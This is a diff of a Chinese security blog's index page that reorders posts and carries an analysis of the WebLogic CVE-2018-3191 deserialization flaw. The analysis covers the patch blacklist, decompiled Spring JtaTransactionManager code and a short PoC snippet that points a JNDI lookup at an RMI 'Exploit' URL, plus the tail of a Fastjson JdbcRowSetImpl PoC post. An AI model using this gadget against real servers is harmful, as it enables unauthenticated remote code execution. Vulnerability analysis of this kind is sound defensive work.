@@ -334,6 +334,184 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/10/23/Weblogic CVE-2018-3191分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/10/23/Weblogic CVE-2018-3191分析/" itemprop="url">
+                  Weblogic CVE-2018-3191分析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-23T15:15:59+08:00">
+                2018-10-23
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/10/23/Weblogic CVE-2018-3191分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/10/23/Weblogic CVE-2018-3191分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2018/10/23/Weblogic CVE-2018-3191分析/" class="leancloud_visitors" data-flag-title="Weblogic CVE-2018-3191分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>已经在公众号发表，链接地址：<a href="https://mp.weixin.qq.com/s/ebKHjpbQcszAy_vPocW0Sg" target="_blank" rel="external">https://mp.weixin.qq.com/s/ebKHjpbQcszAy_vPocW0Sg</a></p>
+<h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h2><p>北京时间10月17日，Oracle官方发布的10月关键补丁更新CPU（Critical Patch Update）中修复了一个高危的WebLogic远程代码执行漏洞（CVE-2018-3191）。该漏洞允许未经身份验证的攻击者通过T3协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。这个漏洞由Matthias Kaiser，loopx9，Li Zhengdong申报。<br><img src="/images/2018-3191-1.png" alt="1"></p>
+<h2 id="2-补丁分析"><a href="#2-补丁分析" class="headerlink" title="2 补丁分析"></a>2 补丁分析</h2><p>如下图所示<br><img src="/images/2018-3191-2.png" alt="2"><br>这回的补丁主要增加了两个大类黑名单，分别是java.rmi.server.RemoteObject和com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager，RemoteObject是用于修补漏洞编号为CVE-2018-3245的漏洞，当时笔者在报这个漏洞的过程中就将所有涉及到RemoteObject相关的poc都提交给了Oracle官方。AbstractPlatformTransactionManager这个黑名单就是用于防止Spring JNDI注入，从官方以前的黑名单上就能看到org.springframework.transaction.support.AbstractPlatformTransactionManager,但是官方没有想到在com.bea.core.repackaged的相关包还有spring的相关类。其实这两个包中的类实现几乎一样，只是来源于不同的包。</p>
+<h2 id="3-动态分析"><a href="#3-动态分析" class="headerlink" title="3 动态分析"></a>3 动态分析</h2><p>通过前一章的静态分析已经知道CVE-2018-3191所对应的补丁，就是AbstractPlatformTransactionManager，用于防止Spring JNDI注入。在我们的PoC中主要用到JtaTransactionManager这个类。下面来看一下这个类中关键的几个地方。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JtaTransactionManager</span> <span class="keyword">extends</span> <span class="title">AbstractPlatformTransactionManager</span> <span class="keyword">implements</span> <span class="title">TransactionFactory</span>, <span class="title">InitializingBean</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_USER_TRANSACTION_NAME = <span class="string">"java:comp/UserTransaction"</span>;</div><div class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] FALLBACK_TRANSACTION_MANAGER_NAMES = <span class="keyword">new</span> String[]&#123;<span class="string">"java:comp/TransactionManager"</span>, <span class="string">"java:appserver/TransactionManager"</span>, <span class="string">"java:pm/TransactionManager"</span>, <span class="string">"java:/TransactionManager"</span>&#125;;</div><div class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_TRANSACTION_SYNCHRONIZATION_REGISTRY_NAME = <span class="string">"java:comp/TransactionSynchronizationRegistry"</span>;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TRANSACTION_SYNCHRONIZATION_REGISTRY_CLASS_NAME = <span class="string">"javax.transaction.TransactionSynchronizationRegistry"</span>;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">transient</span> JndiTemplate jndiTemplate;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">transient</span> UserTransaction userTransaction;</div><div class="line">   <span class="keyword">private</span> String userTransactionName;</div><div class="line">    .....</div></pre></td></tr></table></figure></p>
+<p>JtaTransactionManager类继承自AbstractPlatformTransactionManager，实现了Serializable接口，其中私有属性userTransactionName是用于JNDI寻址。<br>在Java反序列化中，入口有很多，readObject是最常见的，定位到JtaTransactionManager.readObject方法，实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</div><div class="line">   ois.defaultReadObject();</div><div class="line">   <span class="keyword">this</span>.jndiTemplate = <span class="keyword">new</span> JndiTemplate();</div><div class="line">   <span class="keyword">this</span>.initUserTransactionAndTransactionManager();</div><div class="line">   <span class="keyword">this</span>.initTransactionSynchronizationRegistry();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>继续跟踪initUserTransactionAndTransactionManager方法的实现：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</div><div class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.userTransactionName)) &#123;</div><div class="line">         <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.lookupUserTransaction(<span class="keyword">this</span>.userTransactionName);</div><div class="line">         <span class="keyword">this</span>.userTransactionObtainedFromJndi = <span class="keyword">true</span>;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">         <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.retrieveUserTransaction();</div><div class="line">      &#125;</div><div class="line">   &#125;</div><div class="line">.....</div></pre></td></tr></table></figure></p>
+<p>在 initUserTransactionAndTransactionManager的方法中就有基于JNDI寻址方法lookupUserTransaction<br>关键寻址部分代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> UserTransaction <span class="title">lookupUserTransaction</span><span class="params">(String userTransactionName)</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</div><div class="line">         <span class="keyword">this</span>.logger.debug(<span class="string">"Retrieving JTA UserTransaction from JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>);</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">return</span> (UserTransaction)<span class="keyword">this</span>.getJndiTemplate().lookup(userTransactionName, UserTransaction.class);</div><div class="line">   &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> TransactionSystemException(<span class="string">"JTA UserTransaction is not available at JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>, var3);</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>有了如上的分析，构造PoC也是水到渠成，下面是PoC的关键代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getJtaTransactionManagerObject</span><span class="params">(String command)</span></span>&#123;</div><div class="line"><span class="keyword">int</span> seq = command.indexOf(<span class="string">':'</span>);</div><div class="line"><span class="keyword">if</span> (seq &lt; <span class="number">0</span>)&#123;</div><div class="line">command = <span class="string">"rmi://localhost:1099/Exploit"</span>;</div><div class="line">&#125;</div><div class="line">JtaTransactionManager jtaTransactionManager = <span class="keyword">new</span> JtaTransactionManager();</div><div class="line">jtaTransactionManager.setUserTransactionName(command);</div><div class="line"><span class="keyword">return</span> jtaTransactionManager;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>更详细的关于JNDI的使用可参考作者以前的博文，这里不再重复。漏洞效果如下图：<br><img src="/images/2018-3191-1.png" alt="3"></p>
+<p>由于这个漏洞利用的gadget是weblogic中自带的，跟JDK版本无关，所以只要系统能连外网，未禁止T3协议，漏洞就可以利用，威力巨大，请尽快升级到Weblogic最新版。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+    <! -- 添加微信图标 -->
+    
+      
+    
+    
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/10/23/基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -474,184 +652,6 @@
 <p>这setAutoCommit里函数里会触发connect函数。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> Connection <span class="title">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.conn != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.conn;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">this</span>.getDataSourceName() != <span class="keyword">null</span>) &#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            InitialContext var1 = <span class="keyword">new</span> InitialContext();</div><div class="line">            DataSource var2 = (DataSource)var1.lookup(<span class="keyword">this</span>.getDataSourceName());</div><div class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.getUsername() != <span class="keyword">null</span> &amp;&amp; !<span class="keyword">this</span>.getUsername().equals(<span class="string">""</span>)?var2.getConnection(<span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()):var2.getConnection();</div><div class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</div><div class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SQLException(<span class="keyword">this</span>.resBundle.handleGetObject(<span class="string">"jdbcrowsetimpl.connect"</span>).toString());</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getUrl() != <span class="keyword">null</span>?DriverManager.getConnection(<span class="keyword">this</span>.getUrl(), <span class="keyword">this</span>.getUsername(), <span class="keyword">this</span>.getPassword()):<span class="keyword">null</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <p>这里面就调用InitialContext的lookup方法，而且找到的就是我们前面设置的DataSourceName(),达到远程调用任意类的目的。由于JdbcRowSetImpl是官方自带的库，所以这个PoC的威力相对来说更厉害。如果还在使用Fastjson 1.2.24版本及以下烦请升级。</p>
 <p>引用：<br>1，<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a><br>2,<a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-    <! -- 添加微信图标 -->
-    
-      
-    
-    
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2018/10/23/Weblogic CVE-2018-3191分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/10/23/Weblogic CVE-2018-3191分析/" itemprop="url">
-                  Weblogic CVE-2018-3191分析
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-23T14:54:40+08:00">
-                2018-10-23
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Java/" itemprop="url" rel="index">
-                    <span itemprop="name">Java</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/10/23/Weblogic CVE-2018-3191分析/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/10/23/Weblogic CVE-2018-3191分析/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2018/10/23/Weblogic CVE-2018-3191分析/" class="leancloud_visitors" data-flag-title="Weblogic CVE-2018-3191分析">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>已经在公众号发表，链接地址：<a href="https://mp.weixin.qq.com/s/ebKHjpbQcszAy_vPocW0Sg" target="_blank" rel="external">https://mp.weixin.qq.com/s/ebKHjpbQcszAy_vPocW0Sg</a></p>
-<h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h2><p>北京时间10月17日，Oracle官方发布的10月关键补丁更新CPU（Critical Patch Update）中修复了一个高危的WebLogic远程代码执行漏洞（CVE-2018-3191）。该漏洞允许未经身份验证的攻击者通过T3协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。这个漏洞由Matthias Kaiser，loopx9，Li Zhengdong申报。<br><img src="/images/2018-3191-1.png" alt="1"></p>
-<h2 id="2-补丁分析"><a href="#2-补丁分析" class="headerlink" title="2 补丁分析"></a>2 补丁分析</h2><p>如下图所示<br><img src="/images/2018-3191-2.png" alt="2"><br>这回的补丁主要增加了两个大类黑名单，分别是java.rmi.server.RemoteObject和com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager，RemoteObject是用于修补漏洞编号为CVE-2018-3245的漏洞，当时笔者在报这个漏洞的过程中就将所有涉及到RemoteObject相关的poc都提交给了Oracle官方。AbstractPlatformTransactionManager这个黑名单就是用于防止Spring JNDI注入，从官方以前的黑名单上就能看到org.springframework.transaction.support.AbstractPlatformTransactionManager,但是官方没有想到在com.bea.core.repackaged的相关包还有spring的相关类。其实这两个包中的类实现几乎一样，只是来源于不同的包。</p>
-<h2 id="3-动态分析"><a href="#3-动态分析" class="headerlink" title="3 动态分析"></a>3 动态分析</h2><p>通过前一章的静态分析已经知道CVE-2018-3191所对应的补丁，就是AbstractPlatformTransactionManager，用于防止Spring JNDI注入。在我们的PoC中主要用到JtaTransactionManager这个类。下面来看一下这个类中关键的几个地方。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JtaTransactionManager</span> <span class="keyword">extends</span> <span class="title">AbstractPlatformTransactionManager</span> <span class="keyword">implements</span> <span class="title">TransactionFactory</span>, <span class="title">InitializingBean</span>, <span class="title">Serializable</span> </span>&#123;</div><div class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_USER_TRANSACTION_NAME = <span class="string">"java:comp/UserTransaction"</span>;</div><div class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] FALLBACK_TRANSACTION_MANAGER_NAMES = <span class="keyword">new</span> String[]&#123;<span class="string">"java:comp/TransactionManager"</span>, <span class="string">"java:appserver/TransactionManager"</span>, <span class="string">"java:pm/TransactionManager"</span>, <span class="string">"java:/TransactionManager"</span>&#125;;</div><div class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String DEFAULT_TRANSACTION_SYNCHRONIZATION_REGISTRY_NAME = <span class="string">"java:comp/TransactionSynchronizationRegistry"</span>;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TRANSACTION_SYNCHRONIZATION_REGISTRY_CLASS_NAME = <span class="string">"javax.transaction.TransactionSynchronizationRegistry"</span>;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">transient</span> JndiTemplate jndiTemplate;</div><div class="line">   <span class="keyword">private</span> <span class="keyword">transient</span> UserTransaction userTransaction;</div><div class="line">   <span class="keyword">private</span> String userTransactionName;</div><div class="line">    .....</div></pre></td></tr></table></figure></p>
-<p>JtaTransactionManager类继承自AbstractPlatformTransactionManager，实现了Serializable接口，其中私有属性userTransactionName是用于JNDI寻址。<br>在Java反序列化中，入口有很多，readObject是最常见的，定位到JtaTransactionManager.readObject方法，实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</div><div class="line">   ois.defaultReadObject();</div><div class="line">   <span class="keyword">this</span>.jndiTemplate = <span class="keyword">new</span> JndiTemplate();</div><div class="line">   <span class="keyword">this</span>.initUserTransactionAndTransactionManager();</div><div class="line">   <span class="keyword">this</span>.initTransactionSynchronizationRegistry();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>继续跟踪initUserTransactionAndTransactionManager方法的实现：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">initUserTransactionAndTransactionManager</span><span class="params">()</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</div><div class="line">   <span class="keyword">if</span> (<span class="keyword">this</span>.userTransaction == <span class="keyword">null</span>) &#123;</div><div class="line">      <span class="keyword">if</span> (StringUtils.hasLength(<span class="keyword">this</span>.userTransactionName)) &#123;</div><div class="line">         <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.lookupUserTransaction(<span class="keyword">this</span>.userTransactionName);</div><div class="line">         <span class="keyword">this</span>.userTransactionObtainedFromJndi = <span class="keyword">true</span>;</div><div class="line">      &#125; <span class="keyword">else</span> &#123;</div><div class="line">         <span class="keyword">this</span>.userTransaction = <span class="keyword">this</span>.retrieveUserTransaction();</div><div class="line">      &#125;</div><div class="line">   &#125;</div><div class="line">.....</div></pre></td></tr></table></figure></p>
-<p>在 initUserTransactionAndTransactionManager的方法中就有基于JNDI寻址方法lookupUserTransaction<br>关键寻址部分代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> UserTransaction <span class="title">lookupUserTransaction</span><span class="params">(String userTransactionName)</span> <span class="keyword">throws</span> TransactionSystemException </span>&#123;</div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.logger.isDebugEnabled()) &#123;</div><div class="line">         <span class="keyword">this</span>.logger.debug(<span class="string">"Retrieving JTA UserTransaction from JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>);</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      <span class="keyword">return</span> (UserTransaction)<span class="keyword">this</span>.getJndiTemplate().lookup(userTransactionName, UserTransaction.class);</div><div class="line">   &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> TransactionSystemException(<span class="string">"JTA UserTransaction is not available at JNDI location ["</span> + userTransactionName + <span class="string">"]"</span>, var3);</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>有了如上的分析，构造PoC也是水到渠成，下面是PoC的关键代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getJtaTransactionManagerObject</span><span class="params">(String command)</span></span>&#123;</div><div class="line"><span class="keyword">int</span> seq = command.indexOf(<span class="string">':'</span>);</div><div class="line"><span class="keyword">if</span> (seq &lt; <span class="number">0</span>)&#123;</div><div class="line">command = <span class="string">"rmi://localhost:1099/Exploit"</span>;</div><div class="line">&#125;</div><div class="line">JtaTransactionManager jtaTransactionManager = <span class="keyword">new</span> JtaTransactionManager();</div><div class="line">jtaTransactionManager.setUserTransactionName(command);</div><div class="line"><span class="keyword">return</span> jtaTransactionManager;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>更详细的关于JNDI的使用可参考作者以前的博文，这里不再重复。漏洞效果如下图：<br><img src="/images/2018-3191-1.png" alt="3"></p>
-<p>由于这个漏洞利用的gadget是weblogic中自带的，跟JDK版本无关，所以只要系统能连外网，未禁止T3协议，漏洞就可以利用，威力巨大，请尽快升级到Weblogic最新版。</p>
 
           
         
